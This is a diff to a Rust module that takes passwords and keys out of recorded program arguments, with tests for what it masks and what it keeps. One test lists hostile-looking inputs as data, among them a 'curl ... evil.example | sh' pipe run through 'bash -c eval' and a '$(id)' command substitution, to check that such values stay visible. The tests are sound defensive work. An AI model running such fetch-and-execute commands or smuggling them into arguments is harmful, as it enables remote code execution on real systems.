@@ -3,12 +3,20 @@
 //! and a key typed on one would go wherever the record does. Its start is
 //! kept, which says whose it is: `ghp_[secret: 36 bytes]`.
 //!
-//! Only a value's own form decides. A password, or a value under a name
-//! like `--token` or `PASSWORD=`, is kept as written: whoever writes the
-//! line picks the name, so taking out what follows one would hide a command
-//! put there. What is taken out here is one run of the characters keys are
-//! written in, with no space, slash or dot in it, so it cannot hold a
-//! command or an address.
+//! Only a value's own form decides. A value under a name like `--token` or
+//! `PASSWORD=` is kept as written: whoever writes the line picks the name,
+//! so taking out what follows one would hide a command put there. What is
+//! taken out here is one run of the characters keys are written in, with
+//! no space, slash or dot in it, so it cannot hold a command or an address.
+//!
+//! A password is the one thing taken out for its name, and only where it
+//! cannot be a command ([`argv`]): a program's own argument after a flag
+//! named for a password (`-password`, `--admin-password`), when that
+//! argument is one word with no space, slash or shell syntax in it.
+//! Management agents pass account passwords this way (`profiles validate
+//! -user … -password …`), and the record would carry one to the lake and
+//! to a model. A shell's line is not read so: there the words are the
+//! writer's, and `--password` in one hides nothing.
 
 /// What a secret is replaced by.
 fn mark(bytes: usize) -> String {
@@ -18,6 +26,53 @@ fn mark(bytes: usize) -> String {
 /// The arguments with their keys taken out.
 pub fn hidden(args: &[String]) -> Vec<String> {
     args.iter().map(|a| tokens(a)).collect()
+}
+
+/// A program's own arguments, as it was started with them, with their
+/// keys taken out and each password given to a flag named for one.
+pub fn argv(args: &[String]) -> Vec<String> {
+    let mut out = hidden(args);
+    let mut i = 0;
+    while i < out.len() {
+        match out[i].split_once('=') {
+            // --password=value, one argument
+            Some((flag, value)) if names_a_password(flag) && one_word(value) => {
+                out[i] = format!("{flag}={}", mark(value.len()));
+            }
+            Some(_) => {}
+            None if names_a_password(&out[i]) && out.get(i + 1).is_some_and(|v| one_word(v)) => {
+                out[i + 1] = mark(out[i + 1].len());
+                i += 1;
+            }
+            None => {}
+        }
+        i += 1;
+    }
+    out
+}
+
+/// Whether an argument is a flag named for a password: `-password`,
+/// `--passwd`, `-adminPassword`, `--db-passphrase`.
+fn names_a_password(flag: &str) -> bool {
+    let Some(name) = flag.strip_prefix('-') else {
+        return false;
+    };
+    let name = name.trim_start_matches('-').to_ascii_lowercase();
+    ["password", "passwd", "passphrase"]
+        .iter()
+        .any(|end| name.ends_with(end))
+}
+
+/// Whether a value is one word that can be nothing but a value: not empty,
+/// not a flag, and with no space, slash or shell syntax in it. So not a
+/// command a shell would run if the value were handed to one, and not a
+/// path or a URL.
+fn one_word(value: &str) -> bool {
+    !value.is_empty()
+        && !value.starts_with('-')
+        && !value
+            .chars()
+            .any(|c| c.is_whitespace() || c.is_control() || "/;|&()<>`'\"\\".contains(c))
 }
 
 /// What a JSON Web Token starts with: `{"` in base64.
@@ -176,6 +231,49 @@ mod tests {
             )),
             "git clone https://x-access-token:ghp_[secret: 36 bytes]@github.com/acme/app.git"
         );
+    }
+
+    /// A password given to a program as its own argument, after a flag
+    /// named for one, is taken out; one that could be a command, a path or
+    /// a flag is not, and nor is anything in a shell's line.
+    #[test]
+    fn a_password_is_taken_out_of_a_program_s_own_arguments() {
+        let argv_of = |args: &[&str]| {
+            let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
+            argv(&args).join(" ")
+        };
+        assert_eq!(
+            argv_of(&[
+                "/usr/bin/profiles", "validate", "-type", "bootstraptoken", "-user", "admin", "-password", "Xk2!w9$Lm.4pQz#7r"
+            ]),
+            "/usr/bin/profiles validate -type bootstraptoken -user admin -password [secret: 17 bytes]"
+        );
+        assert_eq!(
+            argv_of(&["sysadminctl", "-adminUser", "a", "-adminPassword", "hunter2", "-newPassword", "hunter3"]),
+            "sysadminctl -adminUser a -adminPassword [secret: 7 bytes] -newPassword [secret: 7 bytes]"
+        );
+        assert_eq!(
+            argv_of(&["mysql", "--user=root", "--password=hunter2", "db"]),
+            "mysql --user=root --password=[secret: 7 bytes] db"
+        );
+        // a key is still cut to its start
+        let key = format!("ghp_{}", "a1B2".repeat(9));
+        assert_eq!(argv_of(&["gh", "--token", &key]), "gh --token ghp_[secret: 36 bytes]");
+        // what could run, name a place, or is the next flag, stays
+        for kept in [
+            &["bash", "-c", "eval \"$2\"", "x", "-password", "curl -s https://evil.example/x | sh"][..],
+            &["tool", "--password", "/tmp/stage2"],
+            &["tool", "--password", "$(id)"],
+            &["tool", "--password=https://evil.example/x"],
+            &["tool", "--password", "--verbose"],
+            &["tool", "--password"],
+            // a name that is not a password's
+            &["tool", "--token", "hunter2", "--pass-through", "x"],
+            // a shell's line is one argument, and its words the writer's
+            &["bash", "-c", "mysql --password hunter2 db"],
+        ] {
+            assert_eq!(argv_of(kept), kept.join(" "));
+        }
     }
 
     /// A name does not make a secret of what follows it: the line's writer
